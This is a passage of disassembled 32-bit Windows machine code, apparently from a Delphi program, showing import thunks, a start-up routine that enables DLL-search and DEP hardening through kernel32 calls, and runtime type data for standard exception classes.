  4042fc:	a1 d0 c3 40 00       	mov    0x40c3d0,%eax
  404301:	c1 e0 02             	shl    $0x2,%eax
  404304:	a3 d4 c3 40 00       	mov    %eax,0x40c3d4
  404309:	33 c0                	xor    %eax,%eax
  40430b:	a3 20 c0 40 00       	mov    %eax,0x40c020
  404310:	33 c0                	xor    %eax,%eax
  404312:	a3 24 c0 40 00       	mov    %eax,0x40c024
  404317:	33 c0                	xor    %eax,%eax
  404319:	a3 28 c0 40 00       	mov    %eax,0x40c028
  40431e:	e8 31 ee ff ff       	call   0x403154
  404323:	33 d2                	xor    %edx,%edx
  404325:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  40432b:	33 c0                	xor    %eax,%eax
  40432d:	a3 2c c0 40 00       	mov    %eax,0x40c02c
  404332:	c6 05 33 c0 40 00 02 	movb   $0x2,0x40c033
  404339:	c6 05 34 c0 40 00 02 	movb   $0x2,0x40c034
  404340:	c6 05 35 c0 40 00 03 	movb   $0x3,0x40c035
  404347:	66 c7 05 dc c3 40 00 	movw   $0x0,0x40c3dc
  40434e:	00 00 
  404350:	66 c7 05 ec c3 40 00 	movw   $0x1,0x40c3ec
  404357:	01 00 
  404359:	e8 fe e4 ff ff       	call   0x40285c
  40435e:	b8 38 c0 40 00       	mov    $0x40c038,%eax
  404363:	ba 98 43 40 00       	mov    $0x404398,%edx
  404368:	e8 b8 f8 ff ff       	call   0x403c25
  40436d:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  404372:	ba 98 43 40 00       	mov    $0x404398,%edx
  404377:	e8 a9 f8 ff ff       	call   0x403c25
  40437c:	33 c0                	xor    %eax,%eax
  40437e:	5a                   	pop    %edx
  40437f:	59                   	pop    %ecx
  404380:	59                   	pop    %ecx
  404381:	64 89 10             	mov    %edx,%fs:(%eax)
  404384:	68 91 43 40 00       	push   $0x404391
  404389:	c3                   	ret
  40438a:	e9 6d ea ff ff       	jmp    0x402dfc
  40438f:	eb f8                	jmp    0x404389
  404391:	5f                   	pop    %edi
  404392:	5e                   	pop    %esi
  404393:	5b                   	pop    %ebx
  404394:	5d                   	pop    %ebp
  404395:	c3                   	ret
  404396:	00 00                	add    %al,(%eax)
  404398:	00 00                	add    %al,(%eax)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	ff 25 58 d1 40 00    	jmp    *0x40d158
  4043a2:	8b c0                	mov    %eax,%eax
  4043a4:	ff 25 54 d1 40 00    	jmp    *0x40d154
  4043aa:	8b c0                	mov    %eax,%eax
  4043ac:	ff 25 50 d1 40 00    	jmp    *0x40d150
  4043b2:	8b c0                	mov    %eax,%eax
  4043b4:	ff 25 4c d1 40 00    	jmp    *0x40d14c
  4043ba:	8b c0                	mov    %eax,%eax
  4043bc:	ff 25 48 d1 40 00    	jmp    *0x40d148
  4043c2:	8b c0                	mov    %eax,%eax
  4043c4:	ff 25 08 d2 40 00    	jmp    *0x40d208
  4043ca:	8b c0                	mov    %eax,%eax
  4043cc:	ff 25 04 d2 40 00    	jmp    *0x40d204
  4043d2:	8b c0                	mov    %eax,%eax
  4043d4:	ff 25 00 d2 40 00    	jmp    *0x40d200
  4043da:	8b c0                	mov    %eax,%eax
  4043dc:	ff 25 fc d1 40 00    	jmp    *0x40d1fc
  4043e2:	8b c0                	mov    %eax,%eax
  4043e4:	ff 25 f8 d1 40 00    	jmp    *0x40d1f8
  4043ea:	8b c0                	mov    %eax,%eax
  4043ec:	ff 25 f4 d1 40 00    	jmp    *0x40d1f4
  4043f2:	8b c0                	mov    %eax,%eax
  4043f4:	ff 25 f0 d1 40 00    	jmp    *0x40d1f0
  4043fa:	8b c0                	mov    %eax,%eax
  4043fc:	ff 25 ec d1 40 00    	jmp    *0x40d1ec
  404402:	8b c0                	mov    %eax,%eax
  404404:	ff 25 e8 d1 40 00    	jmp    *0x40d1e8
  40440a:	8b c0                	mov    %eax,%eax
  40440c:	ff 25 e4 d1 40 00    	jmp    *0x40d1e4
  404412:	8b c0                	mov    %eax,%eax
  404414:	ff 25 e0 d1 40 00    	jmp    *0x40d1e0
  40441a:	8b c0                	mov    %eax,%eax
  40441c:	ff 25 dc d1 40 00    	jmp    *0x40d1dc
  404422:	8b c0                	mov    %eax,%eax
  404424:	ff 25 d8 d1 40 00    	jmp    *0x40d1d8
  40442a:	8b c0                	mov    %eax,%eax
  40442c:	ff 25 d4 d1 40 00    	jmp    *0x40d1d4
  404432:	8b c0                	mov    %eax,%eax
  404434:	ff 25 d0 d1 40 00    	jmp    *0x40d1d0
  40443a:	8b c0                	mov    %eax,%eax
  40443c:	ff 25 cc d1 40 00    	jmp    *0x40d1cc
  404442:	8b c0                	mov    %eax,%eax
  404444:	ff 25 c8 d1 40 00    	jmp    *0x40d1c8
  40444a:	8b c0                	mov    %eax,%eax
  40444c:	ff 25 c4 d1 40 00    	jmp    *0x40d1c4
  404452:	8b c0                	mov    %eax,%eax
  404454:	ff 25 c0 d1 40 00    	jmp    *0x40d1c0
  40445a:	8b c0                	mov    %eax,%eax
  40445c:	ff 25 bc d1 40 00    	jmp    *0x40d1bc
  404462:	8b c0                	mov    %eax,%eax
  404464:	ff 25 b8 d1 40 00    	jmp    *0x40d1b8
  40446a:	8b c0                	mov    %eax,%eax
  40446c:	ff 25 b4 d1 40 00    	jmp    *0x40d1b4
  404472:	8b c0                	mov    %eax,%eax
  404474:	ff 25 b0 d1 40 00    	jmp    *0x40d1b0
  40447a:	8b c0                	mov    %eax,%eax
  40447c:	ff 25 ac d1 40 00    	jmp    *0x40d1ac
  404482:	8b c0                	mov    %eax,%eax
  404484:	ff 25 a8 d1 40 00    	jmp    *0x40d1a8
  40448a:	8b c0                	mov    %eax,%eax
  40448c:	ff 25 a4 d1 40 00    	jmp    *0x40d1a4
  404492:	8b c0                	mov    %eax,%eax
  404494:	ff 25 a0 d1 40 00    	jmp    *0x40d1a0
  40449a:	8b c0                	mov    %eax,%eax
  40449c:	ff 25 9c d1 40 00    	jmp    *0x40d19c
  4044a2:	8b c0                	mov    %eax,%eax
  4044a4:	ff 25 98 d1 40 00    	jmp    *0x40d198
  4044aa:	8b c0                	mov    %eax,%eax
  4044ac:	ff 25 94 d1 40 00    	jmp    *0x40d194
  4044b2:	8b c0                	mov    %eax,%eax
  4044b4:	ff 25 90 d1 40 00    	jmp    *0x40d190
  4044ba:	8b c0                	mov    %eax,%eax
  4044bc:	ff 25 8c d1 40 00    	jmp    *0x40d18c
  4044c2:	8b c0                	mov    %eax,%eax
  4044c4:	ff 25 88 d1 40 00    	jmp    *0x40d188
  4044ca:	8b c0                	mov    %eax,%eax
  4044cc:	ff 25 84 d1 40 00    	jmp    *0x40d184
  4044d2:	8b c0                	mov    %eax,%eax
  4044d4:	ff 25 80 d1 40 00    	jmp    *0x40d180
  4044da:	8b c0                	mov    %eax,%eax
  4044dc:	ff 25 7c d1 40 00    	jmp    *0x40d17c
  4044e2:	8b c0                	mov    %eax,%eax
  4044e4:	ff 25 78 d1 40 00    	jmp    *0x40d178
  4044ea:	8b c0                	mov    %eax,%eax
  4044ec:	ff 25 74 d1 40 00    	jmp    *0x40d174
  4044f2:	8b c0                	mov    %eax,%eax
  4044f4:	ff 25 70 d1 40 00    	jmp    *0x40d170
  4044fa:	8b c0                	mov    %eax,%eax
  4044fc:	ff 25 6c d1 40 00    	jmp    *0x40d16c
  404502:	8b c0                	mov    %eax,%eax
  404504:	ff 25 68 d1 40 00    	jmp    *0x40d168
  40450a:	8b c0                	mov    %eax,%eax
  40450c:	ff 25 64 d1 40 00    	jmp    *0x40d164
  404512:	8b c0                	mov    %eax,%eax
  404514:	ff 25 60 d1 40 00    	jmp    *0x40d160
  40451a:	8b c0                	mov    %eax,%eax
  40451c:	ff 25 38 d2 40 00    	jmp    *0x40d238
  404522:	8b c0                	mov    %eax,%eax
  404524:	ff 25 3c d2 40 00    	jmp    *0x40d23c
  40452a:	8b c0                	mov    %eax,%eax
  40452c:	ff 25 34 d2 40 00    	jmp    *0x40d234
  404532:	8b c0                	mov    %eax,%eax
  404534:	ff 25 30 d2 40 00    	jmp    *0x40d230
  40453a:	8b c0                	mov    %eax,%eax
  40453c:	ff 25 2c d2 40 00    	jmp    *0x40d22c
  404542:	8b c0                	mov    %eax,%eax
  404544:	ff 25 28 d2 40 00    	jmp    *0x40d228
  40454a:	8b c0                	mov    %eax,%eax
  40454c:	ff 25 24 d2 40 00    	jmp    *0x40d224
  404552:	8b c0                	mov    %eax,%eax
  404554:	ff 25 20 d2 40 00    	jmp    *0x40d220
  40455a:	8b c0                	mov    %eax,%eax
  40455c:	ff 25 1c d2 40 00    	jmp    *0x40d21c
  404562:	8b c0                	mov    %eax,%eax
  404564:	ff 25 18 d2 40 00    	jmp    *0x40d218
  40456a:	8b c0                	mov    %eax,%eax
  40456c:	ff 25 14 d2 40 00    	jmp    *0x40d214
  404572:	8b c0                	mov    %eax,%eax
  404574:	ff 25 10 d2 40 00    	jmp    *0x40d210
  40457a:	8b c0                	mov    %eax,%eax
  40457c:	53                   	push   %ebx
  40457d:	68 cc 45 40 00       	push   $0x4045cc
  404582:	e8 d5 fe ff ff       	call   0x40445c
  404587:	8b d8                	mov    %eax,%ebx
  404589:	68 dc 45 40 00       	push   $0x4045dc
  40458e:	53                   	push   %ebx
  40458f:	e8 d0 fe ff ff       	call   0x404464
  404594:	85 c0                	test   %eax,%eax
  404596:	74 07                	je     0x40459f
  404598:	68 f0 45 40 00       	push   $0x4045f0
  40459d:	ff d0                	call   *%eax
  40459f:	68 f4 45 40 00       	push   $0x4045f4
  4045a4:	53                   	push   %ebx
  4045a5:	e8 ba fe ff ff       	call   0x404464
  4045aa:	85 c0                	test   %eax,%eax
  4045ac:	74 07                	je     0x4045b5
  4045ae:	68 01 80 00 00       	push   $0x8001
  4045b3:	ff d0                	call   *%eax
  4045b5:	68 08 46 40 00       	push   $0x404608
  4045ba:	53                   	push   %ebx
  4045bb:	e8 a4 fe ff ff       	call   0x404464
  4045c0:	85 c0                	test   %eax,%eax
  4045c2:	74 04                	je     0x4045c8
  4045c4:	6a 01                	push   $0x1
  4045c6:	ff d0                	call   *%eax
  4045c8:	5b                   	pop    %ebx
  4045c9:	c3                   	ret
  4045ca:	00 00                	add    %al,(%eax)
  4045cc:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  4045d0:	65 6c                	gs insb (%dx),%es:(%edi)
  4045d2:	33 32                	xor    (%edx),%esi
  4045d4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4045d7:	6c                   	insb   (%dx),%es:(%edi)
  4045d8:	00 00                	add    %al,(%eax)
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	53                   	push   %ebx
  4045dd:	65 74 44             	gs je  0x404624
  4045e0:	6c                   	insb   (%dx),%es:(%edi)
  4045e1:	6c                   	insb   (%dx),%es:(%edi)
  4045e2:	44                   	inc    %esp
  4045e3:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4045ea:	79 57                	jns    0x404643
	...
  4045f4:	53                   	push   %ebx
  4045f5:	65 74 53             	gs je  0x40464b
  4045f8:	65 61                	gs popa
  4045fa:	72 63                	jb     0x40465f
  4045fc:	68 50 61 74 68       	push   $0x68746150
  404601:	4d                   	dec    %ebp
  404602:	6f                   	outsl  %ds:(%esi),(%dx)
  404603:	64 65 00 00          	fs add %al,%gs:(%eax)
  404607:	00 53 65             	add    %dl,0x65(%ebx)
  40460a:	74 50                	je     0x40465c
  40460c:	72 6f                	jb     0x40467d
  40460e:	63 65 73             	arpl   %esp,0x73(%ebp)
  404611:	73 44                	jae    0x404657
  404613:	45                   	inc    %ebp
  404614:	50                   	push   %eax
  404615:	50                   	push   %eax
  404616:	6f                   	outsl  %ds:(%esi),(%dx)
  404617:	6c                   	insb   (%dx),%es:(%edi)
  404618:	69 63 79 00 00 00 00 	imul   $0x0,0x79(%ebx),%esp
  40461f:	00 50 46             	add    %dl,0x46(%eax)
  404622:	40                   	inc    %eax
	...
  404633:	00 62 46             	add    %ah,0x46(%edx)
  404636:	40                   	inc    %eax
  404637:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40463a:	00 00                	add    %al,(%eax)
  40463c:	3c 10                	cmp    $0x10,%al
  40463e:	40                   	inc    %eax
  40463f:	00 c4                	add    %al,%ah
  404641:	29 40 00             	sub    %eax,0x0(%eax)
  404644:	ac                   	lods   %ds:(%esi),%al
  404645:	28 40 00             	sub    %al,0x0(%eax)
  404648:	d4 28                	aam    $0x28
  40464a:	40                   	inc    %eax
  40464b:	00 18                	add    %bl,(%eax)
  40464d:	29 40 00             	sub    %eax,0x0(%eax)
  404650:	0e                   	push   %cs
  404651:	00 00                	add    %al,(%eax)
  404653:	00 00                	add    %al,(%eax)
  404655:	00 01                	add    %al,(%ecx)
  404657:	00 00                	add    %al,(%eax)
  404659:	00 00                	add    %al,(%eax)
  40465b:	10 40 00             	adc    %al,0x0(%eax)
  40465e:	04 00                	add    $0x0,%al
  404660:	00 00                	add    %al,(%eax)
  404662:	09 45 78             	or     %eax,0x78(%ebp)
  404665:	63 65 70             	arpl   %esp,0x70(%ebp)
  404668:	74 69                	je     0x4046d3
  40466a:	6f                   	outsl  %ds:(%esi),(%dx)
  40466b:	6e                   	outsb  %ds:(%esi),(%dx)
	...
  404684:	a0 46 40 00 0c       	mov    0xc004046,%al
  404689:	00 00                	add    %al,(%eax)
  40468b:	00 50 46             	add    %dl,0x46(%eax)
  40468e:	40                   	inc    %eax
  40468f:	00 c4                	add    %al,%ah
  404691:	29 40 00             	sub    %eax,0x0(%eax)
  404694:	ac                   	lods   %ds:(%esi),%al
  404695:	28 40 00             	sub    %al,0x0(%eax)
  404698:	d4 28                	aam    $0x28
  40469a:	40                   	inc    %eax
  40469b:	00 18                	add    %bl,(%eax)
  40469d:	29 40 00             	sub    %eax,0x0(%eax)
  4046a0:	06                   	push   %es
  4046a1:	45                   	inc    %ebp
  4046a2:	41                   	inc    %ecx
  4046a3:	62 6f 72             	bound  %ebp,0x72(%edi)
  4046a6:	74 90                	je     0x404638
	...
  4046c0:	dc 46 40             	faddl  0x40(%esi)
  4046c3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4046c6:	00 00                	add    %al,(%eax)
  4046c8:	50                   	push   %eax
  4046c9:	46                   	inc    %esi
  4046ca:	40                   	inc    %eax
  4046cb:	00 c4                	add    %al,%ah
  4046cd:	29 40 00             	sub    %eax,0x0(%eax)
  4046d0:	ac                   	lods   %ds:(%esi),%al
  4046d1:	28 40 00             	sub    %al,0x0(%eax)
  4046d4:	38 5a 40             	cmp    %bl,0x40(%edx)
  4046d7:	00 2c 5a             	add    %ch,(%edx,%ebx,2)
  4046da:	40                   	inc    %eax
  4046db:	00 0c 45 4f 75 74 4f 	add    %cl,0x4f74754f(,%eax,2)
  4046e2:	66 4d                	dec    %bp
  4046e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4046e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046e7:	72 79                	jb     0x404762
  4046e9:	8d 40 00             	lea    0x0(%eax),%eax
	...
  404704:	20 47 40             	and    %al,0x40(%edi)
  404707:	00 10                	add    %dl,(%eax)
  404709:	00 00                	add    %al,(%eax)
  40470b:	00 50 46             	add    %dl,0x46(%eax)
  40470e:	40                   	inc    %eax
  40470f:	00 c4                	add    %al,%ah
  404711:	29 40 00             	sub    %eax,0x0(%eax)
  404714:	ac                   	lods   %ds:(%esi),%al
  404715:	28 40 00             	sub    %al,0x0(%eax)
  404718:	d4 28                	aam    $0x28
  40471a:	40                   	inc    %eax
  40471b:	00 18                	add    %bl,(%eax)
  40471d:	29 40 00             	sub    %eax,0x0(%eax)
  404720:	0b 45 49             	or     0x49(%ebp),%eax
  404723:	6e                   	outsb  %ds:(%esi),(%dx)
  404724:	4f                   	dec    %edi
  404725:	75 74                	jne    0x40479b
  404727:	45                   	inc    %ebp
  404728:	72 72                	jb     0x40479c
  40472a:	6f                   	outsl  %ds:(%esi),(%dx)
  40472b:	72 00                	jb     0x40472d
	...
  404741:	00 00                	add    %al,(%eax)
  404743:	00 60 47             	add    %ah,0x47(%eax)
  404746:	40                   	inc    %eax
  404747:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40474a:	00 00                	add    %al,(%eax)
  40474c:	50                   	push   %eax
  40474d:	46                   	inc    %esi
  40474e:	40                   	inc    %eax
  40474f:	00 c4                	add    %al,%ah
  404751:	29 40 00             	sub    %eax,0x0(%eax)
  404754:	ac                   	lods   %ds:(%esi),%al
  404755:	28 40 00             	sub    %al,0x0(%eax)
  404758:	d4 28                	aam    $0x28
  40475a:	40                   	inc    %eax
  40475b:	00 18                	add    %bl,(%eax)
  40475d:	29 40 00             	sub    %eax,0x0(%eax)
  404760:	09 45 49             	or     %eax,0x49(%ebp)
  404763:	6e                   	outsb  %ds:(%esi),(%dx)
  404764:	74 45                	je     0x4047ab
  404766:	72 72                	jb     0x4047da
  404768:	6f                   	outsl  %ds:(%esi),(%dx)
  404769:	72 8b                	jb     0x4046f6
  40476b:	c0 00 00             	rolb   $0x0,(%eax)
	...
  404782:	00 00                	add    %al,(%eax)
  404784:	a0 47 40 00 0c       	mov    0xc004047,%al
  404789:	00 00                	add    %al,(%eax)
  40478b:	00 60 47             	add    %ah,0x47(%eax)
  40478e:	40                   	inc    %eax
  40478f:	00 c4                	add    %al,%ah
  404791:	29 40 00             	sub    %eax,0x0(%eax)
  404794:	ac                   	lods   %ds:(%esi),%al
  404795:	28 40 00             	sub    %al,0x0(%eax)
  404798:	d4 28                	aam    $0x28
  40479a:	40                   	inc    %eax
  40479b:	00 18                	add    %bl,(%eax)
  40479d:	29 40 00             	sub    %eax,0x0(%eax)
  4047a0:	0a 45 44             	or     0x44(%ebp),%al
  4047a3:	69 76 42 79 5a 65 72 	imul   $0x72655a79,0x42(%esi),%esi
  4047aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ab:	90                   	nop
	...
  4047c4:	e0 47                	loopne 0x40480d
  4047c6:	40                   	inc    %eax
  4047c7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4047ca:	00 00                	add    %al,(%eax)
  4047cc:	60                   	pusha
  4047cd:	47                   	inc    %edi
  4047ce:	40                   	inc    %eax
  4047cf:	00 c4                	add    %al,%ah
  4047d1:	29 40 00             	sub    %eax,0x0(%eax)
  4047d4:	ac                   	lods   %ds:(%esi),%al
  4047d5:	28 40 00             	sub    %al,0x0(%eax)
  4047d8:	d4 28                	aam    $0x28
  4047da:	40                   	inc    %eax
  4047db:	00 18                	add    %bl,(%eax)
  4047dd:	29 40 00             	sub    %eax,0x0(%eax)
  4047e0:	0b 45 52             	or     0x52(%ebp),%eax
  4047e3:	61                   	popa
  4047e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4047e5:	67 65 45             	addr16 gs inc %ebp
  4047e8:	72 72                	jb     0x40485c
  4047ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4047eb:	72 00                	jb     0x4047ed
	...
  404801:	00 00                	add    %al,(%eax)
  404803:	00 20                	add    %ah,(%eax)
  404805:	48                   	dec    %eax
  404806:	40                   	inc    %eax
  404807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40480a:	00 00                	add    %al,(%eax)
  40480c:	60                   	pusha
  40480d:	47                   	inc    %edi
  40480e:	40                   	inc    %eax
  40480f:	00 c4                	add    %al,%ah
  404811:	29 40 00             	sub    %eax,0x0(%eax)
  404814:	ac                   	lods   %ds:(%esi),%al
  404815:	28 40 00             	sub    %al,0x0(%eax)
  404818:	d4 28                	aam    $0x28
  40481a:	40                   	inc    %eax
  40481b:	00 18                	add    %bl,(%eax)
  40481d:	29 40 00             	sub    %eax,0x0(%eax)
  404820:	0c 45                	or     $0x45,%al
  404822:	49                   	dec    %ecx
  404823:	6e                   	outsb  %ds:(%esi),(%dx)
  404824:	74 4f                	je     0x404875
  404826:	76 65                	jbe    0x40488d
  404828:	72 66                	jb     0x404890
  40482a:	6c                   	insb   (%dx),%es:(%edi)
  40482b:	6f                   	outsl  %ds:(%esi),(%dx)
  40482c:	77 8d                	ja     0x4047bb
  40482e:	40                   	inc    %eax
	...
  404847:	00 64 48 40          	add    %ah,0x40(%eax,%ecx,2)
  40484b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40484e:	00 00                	add    %al,(%eax)
  404850:	50                   	push   %eax
  404851:	46                   	inc    %esi
  404852:	40                   	inc    %eax
  404853:	00 c4                	add    %al,%ah
  404855:	29 40 00             	sub    %eax,0x0(%eax)
  404858:	ac                   	lods   %ds:(%esi),%al
  404859:	28 40 00             	sub    %al,0x0(%eax)
  40485c:	d4 28                	aam    $0x28
  40485e:	40                   	inc    %eax
  40485f:	00 18                	add    %bl,(%eax)
  404861:	29 40 00             	sub    %eax,0x0(%eax)
  404864:	0a 45 4d             	or     0x4d(%ebp),%al
  404867:	61                   	popa
  404868:	74 68                	je     0x4048d2
  40486a:	45                   	inc    %ebp
  40486b:	72 72                	jb     0x4048df
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	72 90                	jb     0x404800
	...
  404888:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404889:	48                   	dec    %eax
  40488a:	40                   	inc    %eax
  40488b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40488e:	00 00                	add    %al,(%eax)
  404890:	64 48                	fs dec %eax
  404892:	40                   	inc    %eax
  404893:	00 c4                	add    %al,%ah
  404895:	29 40 00             	sub    %eax,0x0(%eax)
  404898:	ac                   	lods   %ds:(%esi),%al
  404899:	28 40 00             	sub    %al,0x0(%eax)
  40489c:	d4 28                	aam    $0x28
  40489e:	40                   	inc    %eax
  40489f:	00 18                	add    %bl,(%eax)
  4048a1:	29 40 00             	sub    %eax,0x0(%eax)
  4048a4:	0a 45 49             	or     0x49(%ebp),%al
  4048a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4048a8:	76 61                	jbe    0x40490b
  4048aa:	6c                   	insb   (%dx),%es:(%edi)
  4048ab:	69 64 4f 70 90 00 00 	imul   $0x90,0x70(%edi,%ecx,2),%esp
  4048b2:	00 
	...
  4048c7:	00 e4                	add    %ah,%ah
  4048c9:	48                   	dec    %eax
  4048ca:	40                   	inc    %eax
  4048cb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	64 48                	fs dec %eax
  4048d2:	40                   	inc    %eax
  4048d3:	00 c4                	add    %al,%ah
  4048d5:	29 40 00             	sub    %eax,0x0(%eax)
  4048d8:	ac                   	lods   %ds:(%esi),%al
  4048d9:	28 40 00             	sub    %al,0x0(%eax)
  4048dc:	d4 28                	aam    $0x28
  4048de:	40                   	inc    %eax
  4048df:	00 18                	add    %bl,(%eax)
  4048e1:	29 40 00             	sub    %eax,0x0(%eax)
  4048e4:	0b 45 5a             	or     0x5a(%ebp),%eax
  4048e7:	65 72 6f             	gs jb  0x404959
  4048ea:	44                   	inc    %esp
  4048eb:	69 76 69 64 65 00 00 	imul   $0x6564,0x69(%esi),%esi
	...
  404906:	00 00                	add    %al,(%eax)
  404908:	24 49                	and    $0x49,%al
  40490a:	40                   	inc    %eax
  40490b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40490e:	00 00                	add    %al,(%eax)
  404910:	64 48                	fs dec %eax
  404912:	40                   	inc    %eax
  404913:	00 c4                	add    %al,%ah
  404915:	29 40 00             	sub    %eax,0x0(%eax)
  404918:	ac                   	lods   %ds:(%esi),%al
  404919:	28 40 00             	sub    %al,0x0(%eax)
  40491c:	d4 28                	aam    $0x28
  40491e:	40                   	inc    %eax
  40491f:	00 18                	add    %bl,(%eax)
  404921:	29 40 00             	sub    %eax,0x0(%eax)
  404924:	09 45 4f             	or     %eax,0x4f(%ebp)
  404927:	76 65                	jbe    0x40498e
  404929:	72 66                	jb     0x404991
  40492b:	6c                   	insb   (%dx),%es:(%edi)
  40492c:	6f                   	outsl  %ds:(%esi),(%dx)
  40492d:	77 8b                	ja     0x4048ba
  40492f:	c0 00 00             	rolb   $0x0,(%eax)
	...
  404946:	00 00                	add    %al,(%eax)
  404948:	64 49                	fs dec %ecx
  40494a:	40                   	inc    %eax
  40494b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40494e:	00 00                	add    %al,(%eax)
  404950:	64 48                	fs dec %eax
  404952:	40                   	inc    %eax
  404953:	00 c4                	add    %al,%ah
  404955:	29 40 00             	sub    %eax,0x0(%eax)
  404958:	ac                   	lods   %ds:(%esi),%al
  404959:	28 40 00             	sub    %al,0x0(%eax)
  40495c:	d4 28                	aam    $0x28
  40495e:	40                   	inc    %eax
  40495f:	00 18                	add    %bl,(%eax)
  404961:	29 40 00             	sub    %eax,0x0(%eax)
  404964:	0a 45 55             	or     0x55(%ebp),%al
  404967:	6e                   	outsb  %ds:(%esi),(%dx)
  404968:	64 65 72 66          	fs gs jb 0x4049d2
  40496c:	6c                   	insb   (%dx),%es:(%edi)
  40496d:	6f                   	outsl  %ds:(%esi),(%dx)
  40496e:	77 90                	ja     0x404900
	...
  404988:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404989:	49                   	dec    %ecx
  40498a:	40                   	inc    %eax
  40498b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40498e:	00 00                	add    %al,(%eax)
  404990:	50                   	push   %eax
  404991:	46                   	inc    %esi
  404992:	40                   	inc    %eax
  404993:	00 c4                	add    %al,%ah
  404995:	29 40 00             	sub    %eax,0x0(%eax)
  404998:	ac                   	lods   %ds:(%esi),%al
  404999:	28 40 00             	sub    %al,0x0(%eax)
  40499c:	d4 28                	aam    $0x28
  40499e:	40                   	inc    %eax
  40499f:	00 18                	add    %bl,(%eax)
  4049a1:	29 40 00             	sub    %eax,0x0(%eax)
  4049a4:	0f 45 49 6e          	cmovne 0x6e(%ecx),%ecx
  4049a8:	76 61                	jbe    0x404a0b
  4049aa:	6c                   	insb   (%dx),%es:(%edi)
  4049ab:	69 64 50 6f 69 6e 74 	imul   $0x65746e69,0x6f(%eax,%edx,2),%esp
  4049b2:	65 
  4049b3:	72 00                	jb     0x4049b5
	...
  4049c9:	00 00                	add    %al,(%eax)
  4049cb:	00 e8                	add    %ch,%al
  4049cd:	49                   	dec    %ecx
  4049ce:	40                   	inc    %eax
  4049cf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4049d2:	00 00                	add    %al,(%eax)
  4049d4:	50                   	push   %eax
  4049d5:	46                   	inc    %esi
  4049d6:	40                   	inc    %eax
  4049d7:	00 c4                	add    %al,%ah
  4049d9:	29 40 00             	sub    %eax,0x0(%eax)
  4049dc:	ac                   	lods   %ds:(%esi),%al
  4049dd:	28 40 00             	sub    %al,0x0(%eax)
  4049e0:	d4 28                	aam    $0x28
  4049e2:	40                   	inc    %eax
  4049e3:	00 18                	add    %bl,(%eax)
  4049e5:	29 40 00             	sub    %eax,0x0(%eax)
  4049e8:	0c 45                	or     $0x45,%al
  4049ea:	49                   	dec    %ecx
  4049eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4049ec:	76 61                	jbe    0x404a4f
  4049ee:	6c                   	insb   (%dx),%es:(%edi)
  4049ef:	69 64 43 61 73 74 8d 	imul   $0x408d7473,0x61(%ebx,%eax,2),%esp
  4049f6:	40 
	...
  404a0f:	00 2c 4a             	add    %ch,(%edx,%ecx,2)
  404a12:	40                   	inc    %eax
  404a13:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a16:	00 00                	add    %al,(%eax)
  404a18:	50                   	push   %eax
  404a19:	46                   	inc    %esi
  404a1a:	40                   	inc    %eax
  404a1b:	00 c4                	add    %al,%ah
  404a1d:	29 40 00             	sub    %eax,0x0(%eax)
  404a20:	ac                   	lods   %ds:(%esi),%al
  404a21:	28 40 00             	sub    %al,0x0(%eax)
  404a24:	d4 28                	aam    $0x28
  404a26:	40                   	inc    %eax
  404a27:	00 18                	add    %bl,(%eax)
  404a29:	29 40 00             	sub    %eax,0x0(%eax)
  404a2c:	0d 45 43 6f 6e       	or     $0x6e6f4345,%eax
  404a31:	76 65                	jbe    0x404a98
  404a33:	72 74                	jb     0x404aa9
  404a35:	45                   	inc    %ebp
  404a36:	72 72                	jb     0x404aaa
  404a38:	6f                   	outsl  %ds:(%esi),(%dx)
  404a39:	72 8b                	jb     0x4049c6
  404a3b:	c0 00 00             	rolb   $0x0,(%eax)
	...
  404a52:	00 00                	add    %al,(%eax)
  404a54:	70 4a                	jo     0x404aa0
  404a56:	40                   	inc    %eax
  404a57:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a5a:	00 00                	add    %al,(%eax)
  404a5c:	50                   	push   %eax
  404a5d:	46                   	inc    %esi
  404a5e:	40                   	inc    %eax
  404a5f:	00 c4                	add    %al,%ah
  404a61:	29 40 00             	sub    %eax,0x0(%eax)
  404a64:	ac                   	lods   %ds:(%esi),%al
  404a65:	28 40 00             	sub    %al,0x0(%eax)
  404a68:	d4 28                	aam    $0x28
  404a6a:	40                   	inc    %eax
  404a6b:	00 18                	add    %bl,(%eax)
  404a6d:	29 40 00             	sub    %eax,0x0(%eax)
  404a70:	10 45 41             	adc    %al,0x41(%ebp)
  404a73:	63 63 65             	arpl   %esp,0x65(%ebx)
  404a76:	73 73                	jae    0x404aeb
  404a78:	56                   	push   %esi
  404a79:	69 6f 6c 61 74 69 6f 	imul   $0x6f697461,0x6c(%edi),%ebp
  404a80:	6e                   	outsb  %ds:(%esi),(%dx)
  404a81:	8d 40 00             	lea    0x0(%eax),%eax
	...
  404a9c:	b8 4a 40 00 0c       	mov    $0xc00404a,%eax
  404aa1:	00 00                	add    %al,(%eax)
  404aa3:	00 50 46             	add    %dl,0x46(%eax)
  404aa6:	40                   	inc    %eax
